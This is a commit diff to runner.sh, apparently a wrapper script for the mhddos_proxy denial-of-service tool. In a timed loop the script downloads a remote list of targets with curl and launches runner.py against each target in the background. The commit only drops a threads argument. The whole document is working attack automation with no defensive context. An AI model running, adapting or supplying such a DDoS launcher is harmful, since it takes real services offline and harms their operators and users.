764ec717b10ed4978e2b68483bd6b5ef67775e6c
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-22 20:46:32 +0200

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -26,8 +26,8 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
+            echo -e $i": " $cmd_line "--rpc 100" "-p 3600" "--debug\n"
+            python3 ~/mhddos_proxy/runner.py $cmd_line $rpc $proxy_upd $debug&
       done
 sleep 20m
 done
